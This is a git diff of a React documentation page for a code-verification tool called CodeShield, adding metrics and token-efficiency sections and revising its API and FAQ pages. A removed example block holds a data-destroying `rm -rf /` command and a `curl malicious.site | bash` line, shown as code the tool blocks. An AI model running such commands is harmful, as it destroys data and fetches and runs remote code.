@@ -6,7 +6,7 @@ interface DocsProps {
     onBack?: () => void;
 }
 
-type DocSection = 'overview' | 'trustgate' | 'styleforge' | 'contextvault' | 'mcp' | 'api' | 'faq' | 'troubleshooting';
+type DocSection = 'overview' | 'trustgate' | 'styleforge' | 'contextvault' | 'metrics' | 'tokens' | 'mcp' | 'api' | 'faq' | 'troubleshooting';
 
 // Icons
 const BookIcon = () => (
@@ -41,6 +41,12 @@ const QuestionIcon = () => (
 );
 const WrenchIcon = () => (
     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
+);
+const ChartIcon = () => (
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M3 3v18h18"/><path d="m19 9-5 5-4-4-3 3"/></svg>
+);
+const ZapIcon = () => (
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
 );
 
 const CodeBlock: React.FC<{ code: string; title?: string }> = ({ code, title }) => {
@@ -172,6 +178,18 @@ export const Docs: React.FC<DocsProps> = ({ onBack }) => {
                                 icon={<DatabaseIcon />}
                                 label="ContextVault"
                             />
+                            <NavItem 
+                                active={activeSection === 'metrics'} 
+                                onClick={() => setActiveSection('metrics')}
+                                icon={<ChartIcon />}
+                                label="Metrics"
+                            />
+                            <NavItem 
+                                active={activeSection === 'tokens'} 
+                                onClick={() => setActiveSection('tokens')}
+                                icon={<ZapIcon />}
+                                label="Token Efficiency"
+                            />
                         </nav>
                         
                         <div className="mb-6 px-3 text-[10px] font-bold text-slate-600 uppercase tracking-widest">Developers</div>
@@ -227,9 +245,11 @@ export const Docs: React.FC<DocsProps> = ({ onBack }) => {
                                     {/* Features Grid */}
                                     <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                         {[
-                                            { title: 'TrustGate', desc: 'Secure Sandbox', icon: <ShieldIcon /> },
-                                            { title: 'StyleForge', desc: 'Auto-formatting', icon: <WandIcon /> },
-                                            { title: 'ContextVault', desc: 'State Memory', icon: <DatabaseIcon /> },
+                                            { title: 'TrustGate', desc: 'Security validation & sandbox execution', icon: <ShieldIcon /> },
+                                            { title: 'StyleForge', desc: 'Convention detection & auto-formatting', icon: <WandIcon /> },
+                                            { title: 'ContextVault', desc: 'State persistence & AI-powered restore', icon: <DatabaseIcon /> },
+                                            { title: 'Metrics', desc: 'Real-time statistics & observability', icon: <ChartIcon /> },
+                                            { title: 'Token Efficiency', desc: 'Up to 90% token savings', icon: <ZapIcon /> },
                                         ].map((feature, i) => (
                                             <div key={i} className="p-6 rounded-2xl bg-white/[0.02] border border-white/5 hover:border-emerald-500/30 transition-colors group">
                                                 <div className="mb-4 text-emerald-400 group-hover:scale-110 transition-transform origin-left">{feature.icon}</div>
@@ -290,40 +310,66 @@ export const Docs: React.FC<DocsProps> = ({ onBack }) => {
                                     <div>
                                         <h1 className="text-4xl font-display font-medium text-white mb-4">TrustGate</h1>
                                         <p className="text-lg text-slate-400 leading-relaxed font-light">
-                                            TrustGate validates generated code in a secure, isolated sandbox environment. It detects potential security vulnerabilities, infinite loops, and malicious imports before they touch your production environment.
+                                            TrustGate validates generated code in a secure, isolated sandbox environment. It detects potential security vulnerabilities, missing imports, syntax errors, and undefined variables before they touch your production environment.
                                         </p>
                                     </div>
 
                                     <div className="space-y-6">
-                                        <h2 className="text-2xl font-display font-medium text-white">Security Detection Strategy</h2>
-                                        <ul className="grid grid-cols-1 gap-4">
+                                        <h2 className="text-2xl font-display font-medium text-white">Core Capabilities</h2>
+                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                             {[
-                                                "Static Analysis of AST to find dangerous imports (os, subprocess)",
-                                                "Resource usage limits to prevent Denial of Service",
-                                                "Network isolation in sandboxed execution containers"
+                                                { title: "Syntax Validation", desc: "AST parsing catches syntax errors, missing colons, unmatched brackets before execution" },
+                                                { title: "Import Detection", desc: "Identifies missing imports from stdlib (os, json, re) and third-party packages (requests, numpy)" },
+                                                { title: "Auto-Fix", desc: "Automatically adds missing imports to your code with 0 LLM tokens for common fixes" },
+                                                { title: "Undefined Names", desc: "Detects potentially undefined variables and references" },
+                                                { title: "Sandbox Execution", desc: "Runs code in Daytona's isolated environment to catch runtime issues" },
+                                                { title: "Confidence Scoring", desc: "0-100% confidence score based on issue severity and count" }
                                             ].map((item, i) => (
-                                                <li key={i} className="flex items-start gap-3 text-slate-400 bg-white/[0.01] p-3 rounded-lg border border-white/5">
-                                                    <span className="text-emerald-400 mt-1"><CheckIcon /></span>
-                                                    {item}
-                                                </li>
+                                                <div key={i} className="p-4 rounded-xl bg-white/[0.02] border border-white/5">
+                                                    <strong className="text-emerald-400 block mb-1">{item.title}</strong>
+                                                    <span className="text-slate-400 text-sm">{item.desc}</span>
+                                                </div>
                                             ))}
-                                        </ul>
+                                        </div>
                                     </div>
                                     
                                     <div>
-                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Example Detection</h2>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Example: Missing Import Detection</h2>
                                         <CodeBlock 
-                                            title="malicious_script.py"
-                                            code={`# Dangerous code detected by TrustGate
-import os
-import subprocess
+                                            title="auto_fix_example.py"
+                                            code={`# Original code with missing import
+def fetch_data(url):
+    return requests.get(url).json()
 
-def dangerous_operation():
-    # TrustGate blocks this instantly
-    subprocess.run("rm -rf /", shell=True)
-    
-    # And this too
-    os.system("curl malicious.site | bash")`}
+# TrustGate output:
+# - is_valid: False
+# - issues: ["Missing import: requests"]
+# - confidence_score: 80%
+# - fixed_code:
+import requests
+
+def fetch_data(url):
+    return requests.get(url).json()`}
+                                        />
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Python API Usage</h2>
+                                        <CodeBlock 
+                                            title="trustgate_example.py"
+                                            code={`from codeshield.trustgate.checker import verify_code
+from codeshield.trustgate.sandbox import full_verification
+
+# Quick static analysis
+result = verify_code(code, auto_fix=True)
+print(f"Valid: {result.is_valid}")
+print(f"Issues: {result.issues}")
+print(f"Confidence: {result.confidence_score:.0%}")
+print(result.fixed_code)
+
+# Full sandbox verification (includes runtime check)
+result = full_verification(code)
+print(f"Sandbox passed: {result['sandbox_result']['passed']}")`}
                                         />
                                     </div>
                                 </div>
@@ -334,17 +380,36 @@ def dangerous_operation():
                                     <div>
                                         <h1 className="text-4xl font-display font-medium text-white mb-4">StyleForge</h1>
                                         <p className="text-lg text-slate-400 leading-relaxed font-light">
-                                            StyleForge ensures your generated code feels like home. It analyzes your existing codebase to detect naming conventions and coding patterns, then automatically adapts new code to match.
+                                            StyleForge ensures your generated code feels like home. It analyzes up to 50 files from your existing codebase to detect naming conventions, then automatically adapts new code to match your project's style.
                                         </p>
+                                    </div>
+
+                                    <div className="space-y-6">
+                                        <h2 className="text-2xl font-display font-medium text-white">Supported Conventions</h2>
+                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                            {[
+                                                { title: "snake_case", desc: "Python standard (PEP 8) - get_user_data, total_value", example: "def get_user_data():" },
+                                                { title: "camelCase", desc: "JavaScript/Java style - getUserData, totalValue", example: "function getUserData()" },
+                                                { title: "PascalCase", desc: "Class names - UserData, TotalValue", example: "class UserData:" },
+                                                { title: "SCREAMING_SNAKE", desc: "Constants - MAX_VALUE, API_KEY", example: "MAX_RETRIES = 3" }
+                                            ].map((item, i) => (
+                                                <div key={i} className="p-4 rounded-xl bg-white/[0.02] border border-white/5">
+                                                    <strong className="text-emerald-400 block mb-1">{item.title}</strong>
+                                                    <span className="text-slate-400 text-sm block mb-2">{item.desc}</span>
+                                                    <code className="text-xs text-slate-500">{item.example}</code>
+                                                </div>
+                                            ))}
+                                        </div>
                                     </div>
 
                                     <div className="space-y-6">
                                         <h2 className="text-2xl font-display font-medium text-white">Features</h2>
                                         <div className="grid grid-cols-1 gap-4">
                                             {[
-                                                { title: "Universal Pattern Detection", desc: "Identifies snake_case, camelCase, PascalCase automatically." },
-                                                { title: "Intelligent Auto-Correction", desc: "Rewrites variable/function names to match project style." },
-                                                { title: "Conflict Prevention", desc: "Ensures new identifiers don't clash with existing ones." }
+                                                { title: "Pattern Detection", desc: "Automatically identifies the dominant naming convention in your codebase by scanning functions, variables, and classes." },
+                                                { title: "Codebase Analysis", desc: "Scans up to 50 Python files to determine your project's style, ignoring test files and virtual environments." },
+                                                { title: "Auto-Correction", desc: "Converts variable and function names to match detected project conventions using LLM assistance." },
+                                                { title: "Typo Detection", desc: "Uses Levenshtein distance to find similar existing names that might be typos (e.g., 'usre' → 'user')." }
                                             ].map((item, i) => (
                                                 <div key={i} className="p-4 rounded-xl bg-white/[0.02] border border-white/5">
                                                     <strong className="text-emerald-400 block mb-1">{item.title}</strong>
@@ -366,7 +431,7 @@ def dangerous_operation():
     return TotalValue`}
                                             />
                                             <CodeBlock
-                                                title="StyleForge (Verified snake_case)"
+                                                title="StyleForge Output (snake_case)"
                                                 code={`def calculate_total(users_list):
     total_value = 0
     for user in users_list:
@@ -374,6 +439,25 @@ def dangerous_operation():
     return total_value`}
                                             />
                                         </div>
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Python API Usage</h2>
+                                        <CodeBlock 
+                                            title="styleforge_example.py"
+                                            code={`from codeshield.styleforge.corrector import check_style
+
+result = check_style(
+    code="def GetUserData(): pass",
+    codebase_path="./src"
+)
+
+print(result.conventions_detected)  
+# {'functions': 'snake_case', 'variables': 'snake_case'}
+
+print(result.corrected_code)
+# def get_user_data(): pass`}
+                                        />
                                     </div>
                                 </div>
                             )}
@@ -419,6 +503,239 @@ def dangerous_operation():
   "notes": "Remember to fix the token expiration logic."
 }`}
                                         />
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Python API Usage</h2>
+                                        <CodeBlock 
+                                            title="contextvault_example.py"
+                                            code={`from codeshield.contextvault.capture import save_context, list_contexts
+from codeshield.contextvault.restore import restore_context
+
+# Save current state
+save_context(
+    name="auth-refactor",
+    files=["src/auth.py", "tests/test_auth.py"],
+    cursor={"file": "src/auth.py", "line": 42, "column": 10},
+    notes="Fixing token expiration logic"
+)
+
+# List all saved contexts
+contexts = list_contexts()
+for ctx in contexts:
+    print(f"{ctx['name']} - {ctx['created_at']}")
+
+# Restore with AI-powered briefing
+result = restore_context("auth-refactor")
+print(result["briefing"])
+# "You were working on auth token logic at line 42..."`}
+                                        />
+                                    </div>
+                                </div>
+                            )}
+
+                            {activeSection === 'metrics' && (
+                                <div className="space-y-10">
+                                    <div>
+                                        <h1 className="text-4xl font-display font-medium text-white mb-4">Metrics & Observability</h1>
+                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
+                                            CodeShield provides real-time, transparent statistics tracking for all features. Every verification, style check, and context operation is measured and persisted to SQLite for historical analysis.
+                                        </p>
+                                    </div>
+
+                                    <div className="space-y-6">
+                                        <h2 className="text-2xl font-display font-medium text-white">Tracked Metrics</h2>
+                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                            {[
+                                                { 
+                                                    title: "TrustGate Metrics", 
+                                                    items: ["Total verifications", "Issues detected", "Auto-fixes applied", "Fix success rate", "Sandbox executions", "Sandbox pass rate"]
+                                                },
+                                                { 
+                                                    title: "StyleForge Metrics", 
+                                                    items: ["Style checks performed", "Conventions detected", "Corrections applied", "Detection accuracy"]
+                                                },
+                                                { 
+                                                    title: "ContextVault Metrics", 
+                                                    items: ["Contexts saved", "Contexts restored", "Active contexts", "Restore success rate"]
+                                                },
+                                                { 
+                                                    title: "Token Metrics", 
+                                                    items: ["Input tokens used", "Output tokens used", "Tokens saved by cache", "Token efficiency ratio", "Estimated cost (USD)"]
+                                                }
+                                            ].map((group, i) => (
+                                                <div key={i} className="p-5 rounded-xl bg-white/[0.02] border border-white/5">
+                                                    <strong className="text-emerald-400 block mb-3">{group.title}</strong>
+                                                    <ul className="space-y-1">
+                                                        {group.items.map((item, j) => (
+                                                            <li key={j} className="text-slate-400 text-sm flex items-center gap-2">
+                                                                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500/50"></span>
+                                                                {item}
+                                                            </li>
+                                                        ))}
+                                                    </ul>
+                                                </div>
+                                            ))}
+                                        </div>
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">API Endpoints</h2>
+                                        <div className="space-y-3">
+                                            {[
+                                                { endpoint: "GET /api/metrics", desc: "Full metrics summary for all features" },
+                                                { endpoint: "GET /api/metrics/trustgate", desc: "TrustGate-specific statistics" },
+                                                { endpoint: "GET /api/metrics/styleforge", desc: "StyleForge-specific statistics" },
+                                                { endpoint: "GET /api/metrics/tokens", desc: "Token usage and efficiency data" }
+                                            ].map((item, i) => (
+                                                <div key={i} className="p-3 rounded-lg bg-white/[0.02] border border-white/5 flex items-center justify-between">
+                                                    <code className="text-emerald-400 text-sm">{item.endpoint}</code>
+                                                    <span className="text-slate-400 text-xs">{item.desc}</span>
+                                                </div>
+                                            ))}
+                                        </div>
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Python API Usage</h2>
+                                        <CodeBlock 
+                                            title="metrics_example.py"
+                                            code={`from codeshield.utils.metrics import get_metrics
+
+metrics = get_metrics()
+summary = metrics.get_summary()
+
+# TrustGate stats
+tg = summary['trustgate']
+print(f"Verifications: {tg['total_verifications']}")
+print(f"Detection rate: {tg['detection_rate']}%")
+print(f"Fix success rate: {tg['fix_success_rate']}%")
+
+# Token stats
+tokens = summary['tokens']
+print(f"Total tokens: {tokens['total_tokens']}")
+print(f"Efficiency: {tokens['token_efficiency']}")
+print(f"Est. cost: \${tokens['estimated_cost_usd']:.4f}")`}
+                                        />
+                                    </div>
+                                </div>
+                            )}
+
+                            {activeSection === 'tokens' && (
+                                <div className="space-y-10">
+                                    <div>
+                                        <h1 className="text-4xl font-display font-medium text-white mb-4">Token Efficiency</h1>
+                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
+                                            CodeShield implements advanced optimization techniques to minimize LLM token usage, achieving up to 90% savings on common operations. This translates directly to cost savings and faster response times.
+                                        </p>
+                                    </div>
+
+                                    {/* Savings Table */}
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-6">Optimization Techniques</h2>
+                                        <div className="space-y-4">
+                                            {[
+                                                { 
+                                                    title: "Local Processing", 
+                                                    savings: "100%",
+                                                    desc: "Fixes 35+ common imports (json, os, requests, numpy, etc.) without any LLM call",
+                                                    color: "emerald"
+                                                },
+                                                { 
+                                                    title: "Response Caching", 
+                                                    savings: "100%",
+                                                    desc: "SQLite-based cache returns identical responses for repeated requests instantly",
+                                                    color: "emerald"
+                                                },
+                                                { 
+                                                    title: "Prompt Compression", 
+                                                    savings: "40-60%",
+                                                    desc: "Shorter, optimized prompts that produce the same quality results",
+                                                    color: "teal"
+                                                },
+                                                { 
+                                                    title: "Dynamic max_tokens", 
+                                                    savings: "50-75%",
+                                                    desc: "Adaptive response limits (100-500 tokens) based on task complexity vs fixed 2000",
+                                                    color: "teal"
+                                                },
+                                                { 
+                                                    title: "Model Tiering", 
+                                                    savings: "30-50%",
+                                                    desc: "Uses cheaper/faster models for simple tasks, reserves powerful models for complex work",
+                                                    color: "cyan"
+                                                }
+                                            ].map((opt, i) => (
+                                                <div key={i} className={`p-5 rounded-xl bg-${opt.color}-500/5 border border-${opt.color}-500/20`}>
+                                                    <div className="flex items-center justify-between mb-2">
+                                                        <strong className={`text-${opt.color}-400`}>{opt.title}</strong>
+                                                        <span className={`px-2 py-1 rounded text-xs font-bold bg-${opt.color}-500/20 text-${opt.color}-400`}>{opt.savings} savings</span>
+                                                    </div>
+                                                    <p className="text-slate-400 text-sm">{opt.desc}</p>
+                                                </div>
+                                            ))}
+                                        </div>
+                                    </div>
+
+                                    {/* Supported Local Fixes */}
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Zero-Token Import Fixes</h2>
+                                        <p className="text-slate-400 mb-4">These 35+ imports are fixed locally without any LLM call:</p>
+                                        <div className="flex flex-wrap gap-2">
+                                            {['json', 'os', 'sys', 're', 'math', 'random', 'datetime', 'time', 'pathlib', 'typing', 'dataclasses', 'collections', 'itertools', 'functools', 'requests', 'httpx', 'asyncio', 'logging', 'subprocess', 'tempfile', 'shutil', 'glob', 'csv', 'sqlite3', 'hashlib', 'base64', 'copy', 'io', 'threading', 'uuid', 'enum', 'abc', 'contextlib', 'pydantic', 'fastapi', 'flask', 'numpy', 'pandas', 'pytest'].map((pkg, i) => (
+                                                <code key={i} className="px-2 py-1 rounded bg-white/5 text-emerald-400 text-xs border border-white/10">{pkg}</code>
+                                            ))}
+                                        </div>
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">How It Works</h2>
+                                        <CodeBlock 
+                                            title="token_optimizer_example.py"
+                                            code={`from codeshield.utils.token_optimizer import (
+    LocalProcessor, 
+    get_token_optimizer
+)
+
+# Example: Code with missing import
+code = "data = json.loads(response)"
+issues = ["Missing import: json"]
+
+# Step 1: Try local fix first (0 tokens!)
+if LocalProcessor.can_fix_locally(code, issues):
+    fixed = LocalProcessor.fix_locally(code, issues)
+    # Result: "import json\\ndata = json.loads(response)"
+    print("Fixed locally - 0 tokens used!")
+else:
+    # Step 2: Fall back to LLM with optimizations
+    # - Compressed prompt (40% smaller)
+    # - Dynamic max_tokens based on code size
+    # - Model tiering (cheap model for simple fix)
+    # - Response cached for future requests
+    pass
+
+# Check efficiency stats
+optimizer = get_token_optimizer()
+stats = optimizer.get_stats()
+print(f"Cache hits: {stats['cache_hits']}")
+print(f"Cache hit rate: {stats['cache_hit_rate']}%")
+print(f"Tokens saved: {stats['tokens_saved_by_cache']}")`}
+                                        />
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">API Endpoints</h2>
+                                        <div className="space-y-3">
+                                            {[
+                                                { endpoint: "GET /api/tokens/efficiency", desc: "Token optimization statistics and savings" },
+                                                { endpoint: "GET /api/tokens/budget", desc: "Budget limits and remaining tokens" }
+                                            ].map((item, i) => (
+                                                <div key={i} className="p-3 rounded-lg bg-white/[0.02] border border-white/5 flex items-center justify-between">
+                                                    <code className="text-emerald-400 text-sm">{item.endpoint}</code>
+                                                    <span className="text-slate-400 text-xs">{item.desc}</span>
+                                                </div>
+                                            ))}
+                                        </div>
                                     </div>
                                 </div>
                             )}
@@ -556,45 +873,124 @@ test_llm_connection(provider="novita")`}
                                     <div>
                                         <h1 className="text-4xl font-display font-medium text-white mb-4">API Reference</h1>
                                         <p className="text-lg text-slate-400 leading-relaxed font-light">
-                                            The CodeShield API allows you to integrate security scanning and style enforcement directly into your CI/CD pipelines or custom tools.
+                                            The CodeShield REST API allows you to integrate security scanning, style enforcement, and observability directly into your CI/CD pipelines or custom tools.
                                         </p>
                                     </div>
 
-                                    <div className="space-y-8">
-                                        <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
-                                            <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
-                                                <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
-                                                <code className="text-sm text-slate-300 font-mono">/api/verify</code>
-                                            </div>
-                                            <div className="p-6">
-                                                <p className="text-sm text-slate-400 mb-6">Analyzes code for security vulnerabilities and dangerous patterns.</p>
-                                                <CodeBlock
-                                                    title="Request Body"
-                                                    code={`{
-  "code": "print('hello')",
+                                    {/* Core Endpoints */}
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-6">Core Endpoints</h2>
+                                        <div className="space-y-6">
+                                            <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
+                                                <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
+                                                    <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
+                                                    <code className="text-sm text-slate-300 font-mono">/api/verify</code>
+                                                    <span className="text-slate-500 text-xs ml-auto">Verify code for issues</span>
+                                                </div>
+                                                <div className="p-6">
+                                                    <CodeBlock
+                                                        title="Request"
+                                                        code={`{
+  "code": "x = json.loads(data)",
   "auto_fix": true,
   "use_sandbox": false
 }`}
-                                                />
+                                                    />
+                                                </div>
                                             </div>
-                                        </div>
 
-                                        <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
-                                            <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
-                                                <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
-                                                <code className="text-sm text-slate-300 font-mono">/api/style</code>
-                                            </div>
-                                            <div className="p-6">
-                                                <p className="text-sm text-slate-400 mb-6">Checks code against the project's detected style conventions.</p>
-                                                <CodeBlock
-                                                    title="Request Body"
-                                                    code={`{
+                                            <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
+                                                <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
+                                                    <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
+                                                    <code className="text-sm text-slate-300 font-mono">/api/style</code>
+                                                    <span className="text-slate-500 text-xs ml-auto">Check style conventions</span>
+                                                </div>
+                                                <div className="p-6">
+                                                    <CodeBlock
+                                                        title="Request"
+                                                        code={`{
   "code": "def MyFunction(): pass",
   "codebase_path": "./src"
 }`}
-                                                />
+                                                    />
+                                                </div>
+                                            </div>
+
+                                            <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
+                                                <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
+                                                    <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
+                                                    <code className="text-sm text-slate-300 font-mono">/api/context/save</code>
+                                                    <span className="text-slate-500 text-xs ml-auto">Save coding context</span>
+                                                </div>
+                                                <div className="p-6">
+                                                    <CodeBlock
+                                                        title="Request"
+                                                        code={`{
+  "name": "auth-refactor",
+  "files": ["src/auth.py"],
+  "cursor": {"file": "src/auth.py", "line": 42},
+  "notes": "Fixing token logic"
+}`}
+                                                    />
+                                                </div>
                                             </div>
                                         </div>
+                                    </div>
+
+                                    {/* Observability Endpoints */}
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-6">Observability Endpoints</h2>
+                                        <div className="grid grid-cols-1 gap-3">
+                                            {[
+                                                { method: "GET", endpoint: "/api/health", desc: "Server health check" },
+                                                { method: "GET", endpoint: "/api/metrics", desc: "Full metrics summary" },
+                                                { method: "GET", endpoint: "/api/metrics/trustgate", desc: "TrustGate statistics" },
+                                                { method: "GET", endpoint: "/api/metrics/styleforge", desc: "StyleForge statistics" },
+                                                { method: "GET", endpoint: "/api/metrics/tokens", desc: "Token usage metrics" },
+                                                { method: "GET", endpoint: "/api/tokens/efficiency", desc: "Token optimization stats" },
+                                                { method: "GET", endpoint: "/api/providers/status", desc: "LLM provider status" },
+                                                { method: "GET", endpoint: "/api/providers/test", desc: "Test LLM connectivity" },
+                                                { method: "GET", endpoint: "/api/integrations/status", desc: "All integrations status" },
+                                                { method: "GET", endpoint: "/api/contexts", desc: "List saved contexts" }
+                                            ].map((item, i) => (
+                                                <div key={i} className="p-3 rounded-lg bg-white/[0.02] border border-white/5 flex items-center gap-3">
+                                                    <span className="px-2 py-0.5 rounded text-xs font-bold bg-blue-500/20 text-blue-400">{item.method}</span>
+                                                    <code className="text-emerald-400 text-sm flex-1">{item.endpoint}</code>
+                                                    <span className="text-slate-500 text-xs">{item.desc}</span>
+                                                </div>
+                                            ))}
+                                        </div>
+                                    </div>
+
+                                    {/* Example Response */}
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Example: Metrics Response</h2>
+                                        <CodeBlock
+                                            title="GET /api/metrics"
+                                            code={`{
+  "trustgate": {
+    "total_verifications": 150,
+    "issues_detected": 45,
+    "auto_fixes_applied": 38,
+    "detection_rate": 30.0,
+    "fix_success_rate": 84.4,
+    "sandbox_executions": 25,
+    "sandbox_success_rate": 92.0
+  },
+  "styleforge": {
+    "total_checks": 80,
+    "conventions_detected": 75,
+    "corrections_applied": 60
+  },
+  "tokens": {
+    "total_input_tokens": 15000,
+    "total_output_tokens": 8000,
+    "tokens_saved_by_cache": 12000,
+    "token_efficiency": 1.88,
+    "estimated_cost_usd": 0.0115
+  }
+}`}
+                                        />
                                     </div>
                                 </div>
                             )}
@@ -604,7 +1000,7 @@ test_llm_connection(provider="novita")`}
                                     <div>
                                         <h1 className="text-4xl font-display font-medium text-white mb-4">Frequently Asked Questions</h1>
                                         <p className="text-lg text-slate-400 leading-relaxed font-light">
-                                            Common questions about CodeShield, its features, and required integrations.
+                                            Common questions about CodeShield, its features, integrations, and token efficiency.
                                         </p>
                                     </div>
 
@@ -612,11 +1008,19 @@ test_llm_connection(provider="novita")`}
                                         {[
                                             {
                                                 q: "What integrations are required?",
-                                                a: "CodeShield requires: CometAPI (primary LLM), Novita.ai (secondary LLM), AIML API (fallback), Daytona (sandbox execution), and LeanMCP (observability). All keys must be configured in .env for full functionality."
+                                                a: "CodeShield requires 5 services: CometAPI (primary LLM), Novita.ai (secondary LLM), AIML API (fallback), Daytona (sandbox execution), and LeanMCP (observability). All API keys must be configured in .env for full functionality."
+                                            },
+                                            {
+                                                q: "How much can I save on tokens?",
+                                                a: "CodeShield achieves up to 90% token savings through: local processing (100% savings for 35+ common imports), response caching (100% for repeated requests), prompt compression (40-60%), dynamic max_tokens (50-75%), and model tiering (30-50%)."
+                                            },
+                                            {
+                                                q: "What is local processing?",
+                                                a: "Local processing fixes common imports like json, os, requests, numpy, pandas, etc. without making any LLM call. This means 0 tokens and instant results for the most common code issues. 35+ imports are supported."
                                             },
                                             {
                                                 q: "How do I check if all services are connected?",
-                                                a: "Use GET /api/integrations/status to check all services, or mcp_health() in Claude/Cursor. The API will show which integrations are configured and their current status."
+                                                a: "Use GET /api/integrations/status to check all services, or mcp_health() in Claude/Cursor. The response shows which integrations are configured and their current status."
                                             },
                                             {
                                                 q: "What is CometAPI?",
@@ -624,7 +1028,7 @@ test_llm_connection(provider="novita")`}
                                             },
                                             {
                                                 q: "What is Novita.ai used for?",
-                                                a: "Novita.ai is the secondary LLM provider offering cost-effective inference for open-source models like DeepSeek-R1. It automatically takes over if CometAPI fails. Docs: novita.ai/docs"
+                                                a: "Novita.ai is the secondary LLM provider offering cost-effective inference for open-source models. It automatically takes over if CometAPI fails, providing redundancy. Docs: novita.ai/docs"
                                             },
                                             {
                                                 q: "What is LeanMCP?",
@@ -635,16 +1039,20 @@ test_llm_connection(provider="novita")`}
                                                 a: "Daytona provides secure sandbox execution for the full_verify tool. It runs untrusted code in an isolated environment to detect runtime issues without risking the host system. Docs: daytona.io/docs"
                                             },
                                             {
-                                                q: "How do I integrate CodeShield with Claude Desktop?",
-                                                a: "Add the mcp_config.json configuration to your Claude Desktop settings. This registers CodeShield's tools (verify_code, check_style, etc.) so Claude can use them during conversations."
-                                            },
-                                            {
-                                                q: "Is the sandbox execution secure?",
-                                                a: "Yes, TrustGate runs code in an isolated environment with resource limits, network isolation, and restricted imports. Dangerous operations are blocked before execution."
-                                            },
-                                            {
                                                 q: "What's the difference between verify_code and full_verify?",
-                                                a: "verify_code does fast static analysis (AST parsing, import checking). full_verify additionally runs code in a sandboxed environment to catch runtime issues like infinite loops."
+                                                a: "verify_code does fast static analysis (AST parsing, import checking) - no sandbox needed. full_verify additionally runs code in a sandboxed Daytona environment to catch runtime issues like infinite loops."
+                                            },
+                                            {
+                                                q: "How does StyleForge detect conventions?",
+                                                a: "StyleForge scans up to 50 Python files in your codebase, extracts function and variable names, then determines the dominant pattern (snake_case, camelCase, PascalCase) using pattern matching."
+                                            },
+                                            {
+                                                q: "Is the response caching secure?",
+                                                a: "Yes, responses are cached in a local SQLite database keyed by a hash of the prompt. Cache is local to your machine and not shared. You can clear the cache anytime."
+                                            },
+                                            {
+                                                q: "How do I integrate with Claude Desktop?",
+                                                a: "Add the mcp_config.json configuration to your Claude Desktop settings. This registers CodeShield's tools (verify_code, check_style, etc.) so Claude can use them during conversations."
                                             }
                                         ].map((faq, i) => (
                                             <div key={i} className="p-5 rounded-xl bg-white/[0.02] border border-white/5 hover:border-emerald-500/20 transition-colors">
